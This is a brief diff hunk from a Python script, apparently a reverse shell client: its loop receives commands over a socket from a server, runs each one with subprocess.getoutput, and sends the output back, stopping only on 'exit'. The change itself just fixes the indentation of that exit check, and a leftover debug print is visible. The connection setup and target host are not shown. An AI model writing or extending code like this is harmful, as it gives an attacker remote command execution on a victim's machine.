@@ -18,7 +18,7 @@ print("Server:", message)
 print("caca2")
 while True:
   command = s.recv(BUFFER_SIZE).decode()
-    if command.lower() == "exit":
+  if command.lower() == "exit":
     break
   output = subprocess.getoutput(command)
   s.send(output.encode())
